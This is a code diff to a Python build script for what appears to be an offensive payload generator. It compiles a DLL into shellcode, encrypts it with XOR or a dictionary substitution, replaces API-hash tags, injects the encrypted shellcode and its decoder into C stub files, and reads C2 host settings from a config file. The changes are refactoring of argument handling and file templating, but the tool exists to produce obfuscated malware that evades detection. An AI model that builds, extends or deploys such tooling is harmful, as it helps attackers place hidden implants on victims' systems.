@@ -14,15 +14,20 @@ config.read(".conf")
 def is_set(value):
     return value != None and value != ""
 
-VERBOSE = True if sys.argv[1] == "true" else False
-PRIORIZE_SIZE = True if sys.argv[2] == "true" else False
+VERBOSE = False
+PRIORIZE_SIZE = False
 
-DLL_NAME = config.get("Payload", "dll_name")
+DLL_NAME = config.get("Payload", "dll_name", fallback="").strip()
+ENCRYPTION_METHOD = config.get("Payload", "encryption_method", fallback="").strip()
+
+if len(sys.argv) > 1:
+    VERBOSE = sys.argv[1].lower() == "true"
+if len(sys.argv) > 2:
+    PRIORIZE_SIZE = sys.argv[2].lower() == "true"
+
 if not DLL_NAME:
-    print("DLL name must be specified in .conf")
-    sys.exit(1)
+    sys.exit("Error: DLL name must be specified in the configuration (.conf) file.")
 
-ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
 if ENCRYPTION_METHOD == "xor":
     if config.get("Payload", "encryption_key") == "random":
         ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
@@ -31,8 +36,7 @@ if ENCRYPTION_METHOD == "xor":
 elif ENCRYPTION_METHOD == "dictionary" or ENCRYPTION_METHOD == "dict":
     ENCRYPTION_KEY = 1
 else:
-    print(f"Unknown encryption method: {ENCRYPTION_METHOD}")
-    sys.exit(1)
+    sys.exit("Error: Invalid encryption method specified in the configuration (.conf) file.\nValid options are 'xor', 'dictionary', or 'dict'.")
 
 # C2 infos
 LHOST = config.get("Payload", "lhost") if is_set(config.get("Payload", "lhost")) else None
@@ -72,13 +76,14 @@ def main():
 
     print("===========PAYLOAD==============") if VERBOSE else None
 
-
     all_tags = extract_tags_from_folder(WORKING_FOLDER)
 
     for file in all_tags:
         filename = file["filename"]
         tags = file["tags"]
-        # print(f"Processing {filename} with tags {tags}")
+        
+        if VERBOSE:
+            print(f"Processing {filename} with tags {tags}")
         # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
         for tag in tags:
             parts = tag.replace("%", "").split("__")
@@ -149,9 +154,9 @@ def main():
                     else:
                         sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}
 
-    compile_dll(DLL_NAME)
+    compile_dll()
 
-    instructions = dll2instructions(WORKING_FOLDER+PAYLOAD_NAME)
+    instructions = dll2instructions()
     with open(WORKING_FOLDER+PAYLOAD_FILE, "w") as f:
         f.write(str(instructions))
 
@@ -166,9 +171,9 @@ def main():
         print(f"\nEncrypted with dictionary\n") if VERBOSE else None
         instructions, association_table, size_payload_phrase = dictionary_encrypt(instructions, VERBOSE)
 
-        sed_file("build/definitions.h", "%PAYLOAD_SIZE%", str(round_pow2(size_payload_phrase)))
-        sed_file("build/payload.c", "%SHELLCODE%", f"unsigned char payload[];\n\n{association_table}\n\nconst char* dict_payload = {instructions};")
-        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "DICT_decrypt(dict_payload);")
+        sed_files(WORKING_FOLDER, "%PAYLOAD_SIZE%", str(round_pow2(size_payload_phrase)))
+        sed_files(WORKING_FOLDER, "%SHELLCODE_DECODER%", "DICT_decrypt(dict_payload);")
+        sed_files(WORKING_FOLDER, "%SHELLCODE%", f"unsigned char payload[];\n\n{association_table}\n\nconst char* dict_payload = {instructions};")
     
     else:
         print(instructions[:32]+"...")
@@ -176,12 +181,12 @@ def main():
         encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
         print(encrypted_instructions[:32]+"...") if VERBOSE else None
 
-        sed_file("build/definitions.h", "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
-        sed_file("build/payload.c", "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
-        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "XOR(payload,sizeof(payload),key);")
+        sed_files(WORKING_FOLDER, "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
+        sed_files(WORKING_FOLDER, "%SHELLCODE_DECODER%", "XOR(payload,sizeof(payload),key);")
+        sed_files(WORKING_FOLDER, "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
     
     print("===================================\n") if VERBOSE else None
-    sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", str(ENCRYPTION_KEY))
+    sed_files(WORKING_FOLDER, "%XOR_KEY%", str(ENCRYPTION_KEY))
 
     
 
